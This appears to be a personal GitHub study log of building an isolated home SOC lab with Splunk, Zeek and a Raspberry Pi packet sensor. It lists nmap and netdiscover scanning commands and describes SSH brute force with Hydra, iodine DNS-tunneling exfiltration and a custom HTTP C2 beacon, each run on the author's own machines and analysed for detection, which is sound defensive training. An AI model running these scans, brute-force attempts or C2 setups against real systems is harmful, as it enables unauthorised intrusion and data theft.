<img width="1920" height="922" alt="Screenshot from 2025-10-22 09-14-53" src="https://github.com/user-attachments/assets/de222ba6-3fe7-49b7-96cb-92fe5eb51f25" />
<img width="1920" height="922" alt="Screenshot from 2025-10-22 09-08-36" src="https://github.com/user-attachments/assets/b43ff784-4aba-4626-b80d-81747bb05494" />
<img width="1920" height="1080" alt="Screenshot from 2025-10-22 10-48-43" src="https://github.com/user-attachments/assets/f01ec5a6-e259-4082-ae7b-f5199151dc04" />
<img width="1920" height="1080" alt="Captura de pantalla 2025-10-22 114108" src="https://github.com/user-attachments/assets/3145db29-327d-4205-9dcc-0c10e680660b" />


## Next Steps
 
 • Automate .pcap capture rotation on Raspberry Pi (with cleanup for older captures).
 
 • Configure Splunk to receive and index Raspberry Pi network logs.
 
 • Expand Splunk dashboard to include network flow analysis panels.
 
 • Practice more advanced Splunk search operators (e.g. eval, lookup, stats with conditions).

## Day 13 - Network Analysis, Splunk Correlation & SSH Traffic Capture

Date: October 23, 2025

## 🧩 Summary:

Today I focused on combining Splunk log monitoring with real network traffic analysis using my Raspberry Pi 4 as a network sensor.
 
 • Verified Splunk connectivity between all machines (host, PC2, and PC3).
 
 • Analyzed SSH brute-force simulation logs in Splunk Web — filtered and visualized failed password attempts, usernames, and IP sources.

 • Built new Splunk dashboard panels and refined search queries for security analysis.
 
 • Captured real network traffic on the Raspberry Pi and confirmed SSH communication packets between my PCs.

 • Learned to interpret TCP 3-way handshake (SYN, SYN/ACK, ACK) in Wireshark and matched it to Splunk logs for correlation.
 
 • Practiced packet filtering and analysis in Wireshark using expressions like tcp.port == 22.
 
 • Tested automatic log and packet capture scripts — confirmed correct operation.

 • Maintained static IP configuration across all systems and verified SSH access stability.

## 💻 Tools & Technologies:

 • Splunk Enterprise (log indexing & alerting)
 
 • Wireshark (network analysis)

 • Raspberry Pi 4 (8GB) as network sensor
 
 • Ubuntu Server + SSH Forwarders
 
 • Custom log generator & Splunk search filters

## 🧩 Extra Work:

 • Studied TryHackMe for ~3 hours (topics: Linux privilege escalation & network fundamentals).
 
 • Practiced threat analysis and basic attack detection logic.

## ✅ Achievements:
 
 • Successful end-to-end visibility: from simulated logs → network packets → dashboard visualization.

 • Confirmed live capture of TCP/SSH handshakes and Splunk correlation.

 • Raspberry Pi functioning as independent, passive monitoring node.

## 🔜 Next Steps:
 
 • Automate Wireshark/pcap export review workflow.
 
 • Explore Splunk correlation searches (match logs + packet timestamps).
 
 • Begin building a Security Events Overview dashboard in Splunk.

 • Continue THM labs focused on network-based attack detection and log correlation.

<img width="1920" height="1080" alt="Captura de pantalla 2025-10-23 192948" src="https://github.com/user-attachments/assets/3cc26e6e-d791-4c25-8338-85070cbff4b1" />

<img width="1920" height="1080" alt="Captura de pantalla 2025-10-23 191129" src="https://github.com/user-attachments/assets/5a8ac8da-d4fb-4ad2-872b-0c241c112dc3" />


## Day 14 - New "Toy"

## 🖥️ New Server Setup (Supermicro Xeon D-1541)

This week I expanded my cybersecurity and homelab environment with a Supermicro X10SDV-8C-TLN4F server (Intel Xeon D-1541, 128 GB ECC RAM, SSD + HDD storage).
The system was fully cleaned, inspected in BIOS, and successfully booted into Proxmox VE 8.4.

## Work completed so far
 
 • Verified all 128 GB RAM, CPU cores, and disks in BIOS and Proxmox.
 
 • Installed and configured Proxmox VE 8.4 on SSD (LVM + ZFS storage pools).
 
 • Created first VM (Ubuntu 24.04 LTS) and confirmed full functionality.
 
 • Tested system stability and temperature monitoring (~53–55 °C under load).
 
 • Prepared for network tuning and static IP configuration in Netplan.

## Next steps:
 
 • Configure static IP on Ubuntu VM.
 
 • Add additional VMs for Splunk Forwarder and Raspberry Pi network-sensor integration.
 
 • Begin documenting performance benchmarks and automation scripts.

<img width="1920" height="1080" alt="Captura de pantalla 2025-10-26 112548" src="https://github.com/user-attachments/assets/d82bb4bd-ec0a-450b-839f-442d329d6b8e" />
<img width="1920" height="1080" alt="Captura de pantalla 2025-10-26 191212" src="https://github.com/user-attachments/assets/b943da35-c411-43d1-ae74-79881d99d625" />


## Day 15-17 - networking, automation, and observability

Date: October 28-30, 2025

Huge progress today across networking, automation, and observability in my home lab.

## ✅ What I accomplished

 • Proxmox & Networking

 • Installed and configured Kali on my Proxmox + UF + static ip
 
 • Installed and configured Windows 10 on my Proxmox + UF + static ip
 
 • Set static IP on my Proxmox Ubuntu VM (ens18) and verified persistence.

 • Integrated the new Supermicro Xeon server into my lab (router + TL-SG105E switch).
 
 • Splunk Forwarding

 • Installed Splunk Universal Forwarder on the Proxmox Ubuntu VM.

 • Configured inputs (syslog + custom file) and connected to my Splunk Enterprise indexer.

 • Deployed a log generator systemd service on the VM to simulate INFO/WARN/ERROR + SSH failed-login lines into /var/log/custom_test.log (ingested live into Splunk).

 • Raspberry Pi Network Sensor
 
 • Pi runs automatic packet captures and SCPs the newest .pcap to my Ubuntu host VM every 15 minutes.

 • Added cron heartbeats and logging; verified hands-off operation.

 
 • Ingested Pi sync logs into Splunk for visibility (source=/home/user/pi_sync.log).

 • Dashboards & Alerts

 • Built Splunk dashboards for syslog + simulated app logs (username, src_ip, port extractions).

 • Added alert: >2 failed SSH passwords within 5 minutes.

## 🔧 Key commands/config (high level)

 • UF install on VM: extract → /opt/splunkforwarder/bin/splunk enable boot-start → set outputs to indexer → add monitors.

 • VM log generator: systemd service writing to /var/log/custom_test.log at random intervals.

 • Pi automation: /usr/local/bin/autocapture.sh + sync_latest_capture.sh via cron (*/15 * * * *), SSH keys for passwordless copy, cleanup (find … -mtime +3 -delete).

## 📈 Results

 • End-to-end pipeline now continuous and automated:

 • VM → Splunk (UF) ✅
 
 • Pi → Host VM (SCP) → Wireshark + Splunk log of sync events ✅

 • Real-time visibility verified in Splunk dashboards; alerts firing as expected.

## ⏱️ Study time

~6 hours (plus troubleshooting)

## 🧠 Reflection

Today I connected all moving parts into a cohesive monitoring stack. I’m much more comfortable with netplan/static IPs, systemd services, cron, UF configuration, and Splunk field extraction/alerts. The lab now feels like a mini SOC where I can iterate faster on real data.

<img width="1911" height="1067" alt="Captura de pantalla 2025-10-28 135742" src="https://github.com/user-attachments/assets/56b7eb7f-fa90-438b-833b-f254c09b998e" />
<img width="1904" height="1069" alt="Captura de pantalla 2025-10-28 135223" src="https://github.com/user-attachments/assets/6d916c59-c7db-4557-86fa-b19c7ebffd0b" />
<img width="1915" height="1074" alt="Captura de pantalla 2025-10-28 124926" src="https://github.com/user-attachments/assets/7c4443f2-6dfa-4377-bca7-9c85b1e0f677" />
<img width="1917" height="1069" alt="Captura de pantalla 2025-10-28 183223" src="https://github.com/user-attachments/assets/a82c5573-f142-40d8-8020-b474863b9930" />
<img width="1919" height="1067" alt="Captura de pantalla 2025-10-29 154231" src="https://github.com/user-attachments/assets/f5e9b269-7b44-42f0-8e7b-ab4e7aa003bd" />
<img width="1925" height="2160" alt="Captura de pantalla 2025-10-31 135456" src="https://github.com/user-attachments/assets/19fe1e88-ff08-49ec-89b0-10923154fafc" />
<img width="1909" height="1068" alt="Captura de pantalla 2025-10-31 135515" src="https://github.com/user-attachments/assets/677bc69a-e7f5-4ea4-b407-832f0f8803e7" />


## Day 18 - Raspberry Pi network capture workflow
Date: November 1, 2025

Objective:  
Validate Raspberry Pi network capture workflow, verify Splunk log ingestion, and confirm visibility of attack events across the lab network.



### ✅ Accomplished
- Confirmed network topology and IP mapping
  - Windows host (192.168.1.69) running VirtualBox and Ubuntu VM (Splunk 192.168.1.123)  
  - Raspberry Pi (192.168.1.18) configured for periodic packet captures  
  - Kali (192.168.1.125) used for SSH brute-force simulations  
  - Additional Proxmox VMs: Ubuntu 192.168.1.133 + Win10 192.168.1.11  

- Verified Pi capture automation
  - autocapture.sh runs scheduled 1-minute captures via tcpdump
  - Files stored under /home/admin/captures/ with automatic cleanup (1 day)
  - sync_latest_capture.sh automatically transfers newest .pcap to Splunk VM (192.168.1.123)
  - Auto transfer verified: last capture successfully appeared on host without manual copy
  - Duplicated cron entries identified (`/usr/local/bin/` vs `/home/admin/`) — fix planned

- Validated data integrity
  - Downloaded .pcap (`auto_20251029_070001.pcap`) inspected in Wireshark  
  - Confirmed full SSH session visibility, packet retransmissions, and ACKs  
  - Splunk dashboard received and indexed “failed SSH login” events correctly



### ⚙️ Current State
- Raspberry Pi fully operational as a passive network sensor  
- Splunk Enterprise receives correlated host logs and synced captures  
- Automatic data pipeline working end-to-end  
- Environment stable and validated  



### 🚀 Next Steps
1. Remove duplicate cron references (`/usr/local/bin/autocapture.sh`)  
2. Confirm single active schedule at /home/admin/autocapture.sh  
3. Optionally adjust capture interval to every 5 min for higher granularity  
4. Start correlating packet data (Pi) with Splunk SSH auth logs  
5. Begin documenting detection rules for brute-force patterns  



Status: ✅ Stable & Verified   
Focus for Next Session: Cron cleanup + advanced capture scheduling + event correlation  

<img width="1920" height="955" alt="Screenshot from 2025-10-29 14-54-07" src="https://github.com/user-attachments/assets/a0edfc1c-54e6-4a72-8341-f829eb47177e" />
<img width="1920" height="955" alt="Screenshot from 2025-10-29 14-54-55" src="https://github.com/user-attachments/assets/983e2871-2427-4c57-8b5a-d466e0e7c48f" />
<img width="1920" height="923" alt="Screenshot from 2025-10-30 12-10-33" src="https://github.com/user-attachments/assets/86bc5385-bd68-41b8-9ecb-bbbaa524a8f4" />
<img width="1920" height="923" alt="Screenshot from 2025-11-01 12-28-21" src="https://github.com/user-attachments/assets/24385e12-556d-46e6-935e-233a57ae250a" />
<img width="1015" height="890" alt="Screenshot from 2025-11-01 14-09-08" src="https://github.com/user-attachments/assets/7c1ce20b-8c6e-4f6e-bce0-41395ca6f1fc" />



## Day 19 - Network Capture & Analysis Progress 
Date: November 3, 2025

## Main work done:

 • Verified that all systems in the lab (Windows, Kali, Ubuntu, and Raspberry Pi) are correctly connected and sending logs.
 
 • Confirmed Raspberry Pi automatic captures are running and sending .pcap files to the host machine successfully.
 
 • Analyzed several captures manually in Wireshark — including SSH and TCP sessions.
 
 • Learned how to interpret multiple packet types, including retransmissions, encrypted SSH data, and ARP exchanges between devices.
 
 • Practiced step-by-step packet interpretation and wrote down manual notes for deeper understanding.
 
 • Validated that the network remains isolated on a closed router (no WAN or external internet).
 
 • Checked and confirmed correct IP mapping for all devices in the local environment.

## Next focus:
 
 • Study TLS and SSH encryption patterns in detail.
 
 • Capture a full 1-minute encrypted session and analyze the handshake process.
 
 • Continue documenting each protocol behavior in personal notes.

## Result:

All systems are stable and functioning as intended. Packet captures and Splunk logs align correctly. The Raspberry Pi automation works as designed, making the lab fully ready for deeper security traffic analysis.

<img width="1918" height="1075" alt="Captura de pantalla 2025-11-03 122946" src="https://github.com/user-attachments/assets/106d3df0-3982-4711-98e8-9a7189a776f8" />
<img width="1919" height="1074" alt="Captura de pantalla 2025-11-03 155617" src="https://github.com/user-attachments/assets/46db7950-4be1-46e9-8274-7d05492e8109" />


## Day 20 - New day in my Cybersecurity Lab   
Date: Date: November 4, 2025  

Topic: Network Scanning & ARP Analysis

Environment:  
- Kali Linux (Attacker / Scanner)  
- Raspberry Pi (Sniffer running `tcpdump`)  
- Windows / Proxmox host network (.50 target)  
- Wireshark for analysis  



## 🎯 Objective
Simulate and analyze basic network reconnaissance techniques in a safe home lab.  
Today’s focus: detecting ARP sweeps and understanding how they appear in packet captures.



## 🧩 Tasks Performed

### 1. Raspberry Pi Packet Capture Setup
Configured tcpdump for rotating captures:sudo tcpdump -i eth0 -s 0 -U -n \
  -w "/home/admin/captures/test_$(date +%Y%m%d_%H%M%S).pcap" \
  -G 60 -W 60 'tcp[tcpflags] & tcp-syn != 0 or arp'
- Verified continuous rotation of .pcap files
- Confirmed correct timestamps and active interface  
- Checked disk usage and file sizes


### 2. Network Scanning from Kali
Performed local subnet discovery:sudo netdiscover -r 192.168.1.0/24
Observed typical ARP sweep behavior:
- Sequential Who has 192.168.1.x? Tell 192.168.1.125
- Source: Kali VM / Proxmox interface
- Dozens of ARP requests per second



### 3. Wireshark Analysis
Filter used:arp && eth.src == <scanner_mac>
Identified patterns:
- Source repeatedly probing IP range  
- Requests: “Who has 192.168.1.117 … 192.168.1.148”
- Confirms active host discovery  
- Recognized the difference between normal ARP cache traffic vs scanning bursts  


## 🧠 Key Learnings
- How ARP scanning appears in packet captures  
- Difference between broadcast and directed ARP traffic  
- Practical use of tcpdump filters for continuous network monitoring  
- Recognizing scanning behavior from timing and sequence patterns  



## 🧰 Tools Used
| Tool | Purpose |
|------|----------|
| tcpdump | Network capture on Raspberry Pi |
| Wireshark | Deep packet inspection |
| netdiscover | ARP-based host discovery |
| nmap *(planned next)* | TCP SYN & port scanning |


## ✅ Next Steps
- Simulate TCP SYN scan with nmap -sS 192.168.1.50 -p 1-1024  
- Capture and analyze SYN flood patterns  
- Compare ARP sweep vs TCP scan signatures  
- Document results in Day 2 report



📘 *This lab is for educational and ethical testing only, performed on my own isolated network.*

<img width="1919" height="1073" alt="Captura de pantalla 2025-11-04 130755" src="https://github.com/user-attachments/assets/e3e52740-5bf5-4cf3-89dd-fbb4b0c04631" />
<img width="1913" height="1071" alt="Captura de pantalla 2025-11-04 133220" src="https://github.com/user-attachments/assets/2802ffaf-fa76-408d-93ea-0af543f4a544" />
<img width="1919" height="1076" alt="Captura de pantalla 2025-11-04 143810" src="https://github.com/user-attachments/assets/b478009c-7f0d-48d1-a13a-857afae115eb" />
<img width="1919" height="1071" alt="Captura de pantalla 2025-11-04 223319" src="https://github.com/user-attachments/assets/3276e71e-2246-4d31-b1ce-9442ed809626" />


## Day 21 — Network Scanning & Troubleshooting Lab  

Date: November 5, 2025
  

## 🔧 Summary
Today’s session focused on end-to-end troubleshooting of my home lab connectivity, followed by network discovery, scanning, and traffic capture analysis.  
I confirmed my monitoring setup works correctly and successfully identified SYN scan and ARP broadcast patterns in Wireshark.

---

## 🧠 Main Activities
1. Troubleshooting network and repeater issue  
   - Server lost Internet connectivity (no ping to 8.8.8.8).  
   - Diagnosed issue using ip a, ip route, and ethtool.  
   - Found problem in my Wi-Fi repeater not passing wired traffic.  
   - Reset repeater → restored connectivity and verified with ping test.  

2. Verifying lab systems  
   - Started Proxmox server, Kali attacker VM, Raspberry Pi capture node, and Windows host.  
   - Checked communication between devices — confirmed all reachable via ping.  

3. Network discovery and scanning  
   Executed from Kali:  
   sudo netdiscover -r 192.168.1.0/24
   sudo nmap -sn 192.168.1.0/24
   nmap -sS -p 1-100 192.168.1.10
   sudo nmap -sV 192.168.1.50
     
   - Observed host discovery packets (ARP + ICMP).  
   - Detected SYN packets from my Kali to multiple hosts.  

4. Packet capture on Raspberry Pi  
   - Manual capture command:  
         sudo tcpdump -i eth0 -w "/home/admin/captures/test_$(date +%Y%m%d_%H%M%S).pcap" -G 60 -W 1
       
   - Transferred PCAPs to host using:  
         scp /home/admin/captures/*.pcap user@host:/path/to/store/
       

5. Wireshark analysis  
   - Opened captures from Pi and analyzed them using display filters:  
         tcp.flags.syn == 1 && tcp.flags.ack == 0
     tcp.flags.reset == 1
     icmp.type == 3
     arp.opcode == 1
       
   - Identified SYN scan activity and ARP broadcasts consistent with host discovery tools.  
   - Verified port scanning pattern from 192.168.1.125 (Kali) to 192.168.1.10, .12, .50.  
   - Observed RST,ACK replies → confirmed closed ports.  
   - Captured ICMP “Destination Unreachable” messages from the gateway during scanning.  


## 📁 Artifacts Collected
- PCAPs:  
  - scan_test2.pcap  
  - scan_test3.pcap  
  - auto_20250909_*.pcap  
- Screenshots:  
  - ARP flood sequence (`Who has 192.168.1.x Tell 192.168.1.1`).  
  - SYN/RST exchange pattern.  
  - ICMP unreachable alerts.  
  - Server interface outputs (`ip a`, ethtool, `ip route`).  

## 🧩 Interpretation
- Network discovery: Repeated ARP requests indicate local subnet enumeration.  
- SYN activity: High rate of SYNs from Kali shows active scanning (reconnaissance).  
- RST/ACK patterns: Closed ports on scanned hosts respond immediately.  
- Connectivity fix: Restoring repeater functionality returned full routing to the Internet.  


## 🧰 Useful Commands

# Show link state of all interfaces
ip a

# Display routing table
ip route

# Check if Ethernet link is detected
sudo ethtool eno2 | grep "Link detected"

# Start capture (rotate every 60s, 1 file)
sudo tcpdump -i eth0 -w "/home/admin/captures/test_$(date +%Y%m%d_%H%M%S).pcap" -G 60 -W 1

# Quick copy of captures to host
scp /home/admin/captures/*.pcap user@192.168.1.:/captures/


## 🧠 Lessons Learned
- Always verify physical links and repeater/switches first during connectivity issues.  
- Using Wireshark filters effectively narrows analysis to useful packets.  
- SYN scan behavior can be visually confirmed via RST/ACK sequences.  
- ARP bursts are normal during scanning but can flood the network under heavy discovery.  


## 🚀 Next Steps
1. Reproduce today’s scan and build a Suricata rule to detect multiple SYNs per second.  
2. Extend capture automation on Raspberry Pi with cron + rotation.  
3. Document a new lab for brute-force login detection using Hydra and Wireshark.  
4. Start preparing visual report templates for GitHub (screenshots + PCAP metadata).  

<img width="1914" height="1075" alt="Captura de pantalla 2025-11-05 133511" src="https://github.com/user-attachments/assets/00b12385-c26a-4f74-b1d2-6755d84df309" />
<img width="1911" height="1075" alt="Captura de pantalla 2025-11-05 134649" src="https://github.com/user-attachments/assets/3c9de903-9b4b-48f4-8898-8b7c68b8e79f" />


### Day 22 — TryHackMe: Cyber Security 101 — Study log

Date: November 7, 2025

### Continued TryHackMe Cyber Security 101 learning path — focused on core SOC fundamentals, SIEM basics, and hands-on labs exploring event triage and log investigation.  
What I did:  
- Completed several THM rooms covering Splunk basics, alert triage, and log interpretation.  
- Practiced Splunk searches and basic triage workflows inside THM exercises.  
Artifacts / notes: No new captures taken today — focused on THM labs and review.  
Next steps: Return to home lab tomorrow, power up systems, and run controlled reconnaissance tests (nmap) to generate traffic for capture and analysis.

###  Day 23 — TryHackMe: Cyber Security 101 + quick Wireshark lab

Date: November 8, 2025
  
Activity: Continued THM SOC 101 path; ran quick attacker tests in my isolated home lab and performed packet analysis.  

## What I did in THM:  
- Completed additional SOC 101 rooms (incident prioritization, threat hunting fundamentals).  
What I did in lab:  
- Powered up lab: Proxmox, Kali (192.168.1.125), victim PC (192.168.1.50), Splunk host (192.168.1.123), Raspberry Pi capture (192.168.1.18).  
- Ran recon & credential tests from Kali: nmap -sS / -A and 7-8-10-1SSH attempts (controlled).  
- Saved the PCAP (`scan_test*.pcap`) from the Pi, copied it to the Splunk host, and spent ~1:15 analyzing packets in Wireshark (SYN scans, ARP sweeps, ICMP responses).  
Findings: Observed ARP sweeps, SYN scans (SYN→RST patterns), ICMP port unreachable (UDP probes) and repeated SSH attempts consistent with a brute-force test.  
Artifacts: screenshots (Wireshark), pcap files (saved on Splunk host).  
Next steps: Export filtered evidence pcaps, map detections to MITRE ATT&CK, and begin turning detections into Splunk saved searches.

###  Day 24 — TryHackMe: Cyber Security 101 — Study log

Date: November 10, 2025

### Started focused SOC 1 Analyst path work on TryHackMe; practiced more real-world detection and triage scenarios.  

## What I did:  
- Completed THM rooms specific to SOC analyst tasks: alert triage, basic threat hunting queries, and simple incident write-ups.  
- Re-read my recent Wireshark findings and matched packet evidence to THM lessons to strengthen understanding.  
Artifacts / notes: THM progress screenshot and notes added to my study log.  
Next steps: Plan a set of controlled attack scenarios in the lab (DNS tunneling & HTTP C2 simulation) and capture traffic for Splunk detection development.

###  Day 25 — TryHackMe: Cyber Security 101 — Certificate achieved + lab follow-up

Date: November 11, 2025
 
## Activity: Finished the TryHackMe Cyber Security 101 learning path (certificate achieved); continued lab work and documentation.  
What I did:  
- Completed final THM labs required for the Cyber Security 101 learning path and downloaded my certificate.  
- Continued analysis of lab captures and prepared evidence for GitHub (pcaps, Wireshark screenshots and prepared Splunk search snippets).  
Start the planned attack simulations in the lab (DNS tunneling, HTTP C2) and develop Splunk alerts/dashboards to detect them. Add Wazuh agents next to correlate host telemetry with network detections.

<img width="1079" height="759" alt="Captura de pantalla 2025-11-16 002049" src="https://github.com/user-attachments/assets/dc6fcab0-800d-4fec-b2fd-ee1d32673866" />

<img width="995" height="720" alt="Captura de pantalla 2025-11-16 002120" src="https://github.com/user-attachments/assets/416e00f7-878c-4c40-a9c9-1cf2de7a3d0d" />


## Day 26 — Network Traffic Analysis: DNS Tunneling, Port Scanning & C2 Investigation

Date: November 12, 2025

## Summary:
Today I focused on analyzing previously captured network traffic (pcap files) from my isolated SOC home lab. My goal was to identify different attacker behaviors that I executed earlier from my Kali machine and verify how they appear in Wireshark. I also checked why DNS tunneling traffic started failing and why the ICMP “Destination Unreachable” messages appeared.

## 🔍 1. DNS Tunneling Traffic Review

I analyzed the DNS packets generated during the iodine DNS tunneling test.
Findings:
 • Multiple DNS queries contained the same structure used by iodine, including:
 • Long encoded subdomain labels
 • Repetitive query patterns
 • High-frequency queries
 • Several responses were labeled as:
 • Unknown operation
 • Malformed Packet
 • This is expected when DNS tunneling tools encode data into DNS payloads.

## Observation:
Later in the capture, DNS queries suddenly triggered ICMP Type 3 Code 3: Port Unreachable from the target (192.168.1.125).
This means:
 • The DNS server port (UDP 53) stopped responding
 • or DNS listener closed
 • or iodine server side wasn’t running anymore

This explains why tunneling worked earlier but stopped afterwards.

## 🕵️ 2. Brute Force & Port Scanning Visibility

In another section of the capture, I reviewed:

✔️ Brute Force Attempts
 • Traffic targeting SSH service
 • Repeated and sequential login attempts from my Kali machine
 • Clear pattern of automated authentication failures
 • Matches expectations of a dictionary attack

✔️ Port Scan Traffic

Large number of SYN packets from 192.168.1.125 → 192.168.1.80 and other hosts:
 • SYN sweeping across hundreds of ports
 • No 3-way handshake (classic Nmap scan)
 • Very fast sequence timestamps → automated reconnaissance
 • Visible payload sizes (66 bytes) consistent with SYN packets


## 🌐 3. ARP Activity & Network Enumeration

I also analyzed ARP-related traffic:
 • Massive list of “Who has IP → Tell 192.168.1.125” messages
 • Even some messages showing “duplicate use of 192.168.1.1 detected!”
 • This happens during ARP scanning (ARP sweep)

This confirms that ARP-based host discovery works and is fully visible in the mirrored capture.

## 🧭 4. C2 (Command & Control) Investigation

I began checking how simulated C2 traffic appears:
 • The HTTP section of the capture showed many HTTP 303 See Other redirects
 • Interesting outbound HTTP requests from 192.168.1.69 (victim) to external-looking IP 4.3.2.1
 • This traffic is likely from the C2 simulation test I started

## 📌 Overall Conclusion

Yesterday’s traffic review successfully confirmed visibility of:
 • ✔️ DNS tunneling
 • ✔️ Brute force patterns
 • ✔️ TCP SYN port scans
 • ✔️ ARP sweeping
 • ✔️ HTTP traffic useful for C2 simulation



<img width="1915" height="1071" alt="Captura de pantalla 2025-11-12 130550" src="https://github.com/user-attachments/assets/8421707e-bc5f-406a-bd7b-45339ff06e0d" />

<img width="1919" height="1077" alt="Captura de pantalla 2025-11-12 122938" src="https://github.com/user-attachments/assets/c2fd72bb-1aa7-41c3-be2a-8cee21536d34" />

<img width="1919" height="1077" alt="Captura de pantalla 2025-11-12 122838" src="https://github.com/user-attachments/assets/6139edaf-2e70-4b7c-909e-2b8473ca0285" />

<img width="1919" height="1076" alt="Captura de pantalla 2025-11-12 121428" src="https://github.com/user-attachments/assets/2728e4d1-38d3-4a72-a042-ada49df87fcc" />



## Next steps:
 1. Build Splunk detection logic for DNS tunneling + brute force
 2. Continue HTTP-based C2 simulation
 3. Compare results in Wireshark vs. Splunk dashboards


## Day - 27 Home Lab – Network Attack Simulation & Traffic Analysis 

Date: Noviembre 13, 2025 

Today I conducted four different offensive techniques in my isolated SOC home lab and captured all traffic using my Raspberry Pi (monitoring port-mirrored traffic via tp-link switch). My attacker was Kali Linux, the victim was Ubuntu, and all results were analyzed later in Wireshark.

## 1️⃣ Port Scanning

I performed a wide TCP SYN scan from Kali (192.168.1.125) against the victim Ubuntu machine (192.168.1.50).
Result in Wireshark:
 • Clear SYN flood patterns
 • Ports responding with RST or SYN/ACK
 • Many red packets → port closed
 • Normal behavior for Nmap SYN scan

This confirmed visibility of reconnaissance activity.

## 2️⃣ Brute-Force Attack

I simulated SSH brute force login attempts from Kali to the victim using Hydra.
Result in Wireshark:
 • High volume of SSH2 “Key Exchange Init”
 • Repeated encrypted packets
 • Login failures visible in /var/log/auth.log (Splunk indexed them)

This successfully created brute-force artifacts for SIEM detection.

## 3️⃣ DNS Tunneling

I simulated exfiltration-like DNS tunneling by sending a file from the victim to Kali’s DNS server.

Result in Wireshark:
 • Long, unusual DNS queries
 • Random-looking subdomains
 • “Malformed Packet” alerts
 • NXDOMAIN and unusual query sizes

Exactly the kind of strange DNS activity analysts detect when spotting tunneling.

## 4️⃣ HTTP C2 Beacon

I deployed a very simple custom HTTP Command & Control setup:
 • Kali runs the C2 python server
 • Ubuntu runs a beacon loop that checks for commands every 10 seconds

Result in Wireshark:
 • Clean HTTP GET → POST pattern
 • Text/plain commands
 • Visible heartbeat beaconing behavior
 • Easy to identify periodic callback traffic

This created realistic C2-like behavior for SOC investigations.


## Final Notes

All traffic was captured via my Raspberry Pi sniffer, stored as .pcap files, and analyzed in Wireshark.
This session helped me understand how each attack type looks at the packet level and prepares me to build Splunk detections for recon, brute-force, DNS tunneling, and C2 activities.

<img width="1919" height="1078" alt="Captura de pantalla 2025-11-13 143642" src="https://github.com/user-attachments/assets/e5723525-4ca8-42c9-ad3e-f85760795461" />
<img width="1919" height="1078" alt="Captura de pantalla 2025-11-13 142327" src="https://github.com/user-attachments/assets/49dce18a-03c5-4f59-b589-61fb834c7de1" />
<img width="1913" height="1075" alt="Captura de pantalla 2025-11-13 161822" src="https://github.com/user-attachments/assets/56b91e98-d9d6-4728-9fa1-649515c532b3" />
<img width="1915" height="1071" alt="Captura de pantalla 2025-11-13 150924" src="https://github.com/user-attachments/assets/a5cbc385-3b38-45a6-8113-f9193c0a17e3" />
<img width="1918" height="1078" alt="Captura de pantalla 2025-11-13 150618" src="https://github.com/user-attachments/assets/e4383386-27a1-4349-8d2d-371c411c9a65" />


## Day 28  — Zeek + Splunk Integration Day

Date: November 14, 2025

Today’s session was fully focused on integrating Zeek network monitoring with Splunk Enterprise inside my isolated SOC home lab. This was one of the most complex and technical days so far, involving troubleshooting, configuration, log ingestion tuning, and validation.

## 🔧 1. Zeek Installation & Troubleshooting on Raspberry Pi
 • Installed Zeek manually on Raspberry Pi 4B (8GB).
 • Fixed multiple issues related to:
 • zeekctl not starting
 • missing state.db
 • wrong permissions on /usr/local/zeek/logs/current
 • Created missing log directories and applied correct ownership/permissions.
 • Successfully ran Zeek in standalone mode:

Verified packet capture by generating ICMP traffic (ping tests).


## 📁 2. Zeek Log Generation Validation

After fixing the file structure and permissions, Zeek finally started generating logs:
 • conn.log
 • dns.log
 • http.log
 • weird.log
 • packet_filter.log
 • telemetry.log
 • and others…

These files appeared correctly inside:

This confirmed that Zeek was processing real traffic on the mirrored network port.


## 🔗 3. Splunk Universal Forwarder on Raspberry Pi
 • Verified that the Splunk Forwarder was running and connected to my Splunk indexer:

• Cleaned the configuration so only valid monitored files remained.
 • Added Zeek log directory to Forwarder monitoring:

 • Confirmed that Splunk Forwarder recognizes the monitored log paths.


## 📊 4. Zeek Logs Successfully Ingested Into Splunk

Finally, confirmed in Splunk Web that Zeek logs were arriving:

Received:
 • DNS events
 • Connection events
 • Telemetry events
 • Other Zeek logs

This proves the entire data pipeline from Raspberry Pi → Zeek → Splunk Forwarder → Splunk Indexer → Search was working.


## 🎯 5. End of Day Results

Today I achieved one of the biggest milestones in my SOC home lab:

✔️ Zeek fully functional on Raspberry Pi
✔️ Real-time packet analysis working
✔️ Splunk Forwarder correctly configured
✔️ Zeek logs forwarded into Splunk in real time
✔️ Validated multiple log sources (DNS, conn, telemetry, etc.)
✔️ Prepared to build Zeek dashboards and detections

This setup now allows me to perform:
 • Network forensics
 • Threat hunting
 • C2 traffic detection
 • DNS tunneling detection
 • HTTP anomaly analysis
 • And full packet-behavior investigation

A huge upgrade for my SOC learning environment.

<img width="1909" height="1061" alt="Captura de pantalla 2025-11-14 174351" src="https://github.com/user-attachments/assets/2913a0f4-1ba3-4446-9117-8d27098c43fc" />

<img width="1911" height="1073" alt="Captura de pantalla 2025-11-14 173942" src="https://github.com/user-attachments/assets/fc5bfaa2-c64a-4d6e-8ac4-267efe7d2e93" />

<img width="1905" height="1067" alt="Captura de pantalla 2025-11-14 173818" src="https://github.com/user-attachments/assets/b3beddbd-3236-4e4a-bc6e-9119b027880a" />

<img width="1914" height="1079" alt="Captura de pantalla 2025-11-14 172323" src="https://github.com/user-attachments/assets/2055d621-a82d-49b7-91b9-fc6f3cb97b74" />

<img width="1914" height="1078" alt="Captura de pantalla 2025-11-14 163556" src="https://github.com/user-attachments/assets/cc6f2bae-bdd2-48a7-8f65-62da8be72271" />


### Day 29 — lab session
Date: November 15, 2025

## Summary:  
Today I focused on integrating Zeek on the Raspberry Pi with my Splunk indexer. I got Zeek running on eth0, added the Zeek log folder to the Splunk Universal Forwarder, and verified Zeek logs (conn, dns, http, telemetry, weird) are indexed in Splunk. I also simulated a few attacks (DNS-based exfil patterns and TCP/SSH scans) and verified they appear in both Zeek logs and Splunk searches.

## Issues / notes:
- Pi time was behind (NTP not reachable in offline lab). Fixed by enabling NTP (when network available) or manually setting clock.
- NIC checksum offloading triggers Zeek warnings; acceptable for now (can run zeek -C or disable offload to remove warnings).


<img width="1905" height="1069" alt="Captura de pantalla 2025-11-15 183519" src="https://github.com/user-attachments/assets/a6b748da-edbc-4354-b6f1-173c9f838bac" />

<img width="1911" height="1068" alt="Captura de pantalla 2025-11-15 183722" src="https://github.com/user-attachments/assets/d5b409f1-3374-4a8d-8541-e369c05fb88f" />

<img width="1912" height="1073" alt="Captura de pantalla 2025-11-15 184437" src="https://github.com/user-attachments/assets/a1516b2f-d214-499a-a872-af3490e5052b" />

<img width="1902" height="1065" alt="Captura de pantalla 2025-11-15 184755" src="https://github.com/user-attachments/assets/77719afb-3191-4a91-8103-8601056f41dc" />

